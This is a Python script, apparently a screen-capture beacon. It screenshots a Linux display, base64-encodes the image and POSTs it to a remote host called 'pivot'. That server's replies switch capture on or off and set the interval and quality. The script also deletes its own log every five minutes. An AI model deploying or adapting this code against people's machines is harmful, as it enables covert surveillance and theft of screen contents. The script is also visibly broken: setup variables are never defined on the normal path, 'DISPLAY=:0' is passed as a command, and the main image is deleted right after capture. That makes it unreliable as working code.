import subprocess
import json
import http.client as http
import base64
import socket
import time
import sys
import os
logtime = time.strftime("%Y-%m-%d-%H-%M-%S")
log = open("{}-grab_log.txt".format(logtime), 'w')
while True:
    try:
        [(s.connect(("8.8.8.8", 53)), s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_STREAM)]]
        break
    except OSError:
        subprocess.run(['sleep', '10'])
        pass
    log.write("Beginning @ " + time.strftime("%Y-%m-%d-%H-%M-%S") + "\n")
    begin = time.time()
    try:
        arch = subprocess.check_output(['uname', '-m'])
    except FileNotFoundError:
        arch = None
    log.write("arch: " + arch.decode())
    server_path = "/includes/screen_requrest.php"
    log.write("server path: " + str(server_path) + "\n")
    while True:
        try:
            hostname = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_STREAM)]][0][1]
            break
        except OSError:
            pass
    log.write("hostname: " + str(hostname) + "\n")
    server_ip = "pivot"
    en = False
    _time = 5
    thumb_perc = 50
    quality = 50
    headers = {'Content-type': 'application/json'}

while arch:
    try:
        if time.time() - begin > 300:
            log.close()
            subprocess.run(['rm', '{}-grab_log.txt'.format(logtime)])
            logtime = time.strftime("%Y-%m-%d-%H-%M-%S")
            log = open("{}-grab_log.txt".format(logtime), 'w')
            begin = time.time()
        subprocess.run(['sleep', str(_time)])
        log.write("_new loop_" + "\n")
        log.write("en state: " + str(en) + "\n")
        _obj = {
            'hostname': hostname,
            'file': ""
        }
        if en:
            log.write("screenshotting enabled" + "\n")
            log.write("thumbnail percent = quality = " + str(quality) + "\n")
            subprocess.run(['DISPLAY=:0', 'scrot', '--thumb', str(thumb_perc), '-q', str(quality), '{}.jpg'.format(hostname)])
            subprocess.run(['rm', '{}.jpg'.format(hostname)])
            with open('{}-thumb.jpg'.format(hostname), 'rb') as f:
                log.write("Opened local img successfully" + "\n")
                img = f.read()
                img = base64.b64encode(img).decode()
                _obj['file'] = img
        else:
            log.write("screenshotting disabled" + "\n")
        conn = http.HTTPConnection("{}:80".format(server_ip))
        _obj = json.dumps(_obj)
        _obj = _obj.encode()
        conn.request("POST", server_path, _obj, headers)
        json_flags = conn.getresponse().read().decode()
        conn.close()
        flags = json.loads(json_flags)
        if 'en' in flags:
            en = flags['en']
        if 'time' in flags:
            _time = flags['time']
        if 'quality' in flags:
            thumb_perc = quality = flags['quality']
        log.write("Flags at EOF: \n")
        [log.write(y + "\n") for y in ["   {0}: {1}, ".format(x, flags[x]) for x in flags]]
        log.flush()
    except Exception as excp:
        log.write("ERROR: \n" + str(excp) + "\n")
        excp_info = sys.exc_info()[:]
        exc_type, exc_obj, exc_tb = excp_info
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.write(str(exc_type) + "\n" + "Filename: " + str(fname) + "\n" + "line #: " + str(exc_tb.tb_lineno) + "\n")
